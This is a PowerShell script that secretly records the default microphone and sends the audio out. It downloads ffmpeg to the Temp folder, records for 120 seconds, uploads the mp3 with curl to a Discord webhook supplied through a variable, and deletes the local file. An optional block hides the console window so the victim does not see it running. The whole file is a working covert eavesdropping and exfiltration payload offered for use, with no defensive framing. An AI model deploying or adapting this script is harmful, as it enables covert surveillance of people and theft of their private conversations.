<#==================== RECORD MICROPHONE TO DISCORD =========================

SYNOPSIS
This script finds the default microphone and records for a specified time to a mp3 file, then sends the file to a discord webhook.

#>
$hookurl = "$dc"
if ($hookurl.Length -lt 120){
	$hookurl = ("https://discord.com/api/webhooks/" + "$dc")
}

# Uncomment $hide='y' below to hide the console

# $hide='y'
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
    if($w -ne [System.IntPtr]::Zero){
        $t::ShowWindowAsync($w,0)
    }else{
        $Host.UI.RawUI.WindowTitle = 'xx'
        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
        $w=$p.MainWindowHandle
        $t::ShowWindowAsync($w,0)
    }
}


Function RecordAudio{
param ([int[]]$t)

$Path = "$env:Temp\ffmpeg.exe"

If (!(Test-Path $Path)){  
$tempDir = "$env:temp"
$apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
$response = Invoke-WebRequest -Uri $apiUrl -Headers @{ "User-Agent" = "PowerShell" } -UseBasicParsing
$release = $response.Content | ConvertFrom-Json
$asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
$zipUrl = $asset.browser_download_url
$zipFilePath = Join-Path $tempDir $asset.name
$extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
Remove-Item -Path $zipFilePath -Force
Remove-Item -Path $extractedDir -Recurse -Force
Write-Output "FFmpeg has been downloaded and extracted to $tempDir"
}

sleep 1

Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
$id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName

$mp3Path = "$env:Temp\AudioClip.mp3"

if ($t.Length -eq 0){$t = 10}

.$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path

curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
sleep 1
rm -Path $mp3Path -Force

}

RecordAudio -t 120 # time to record microphone in seconds
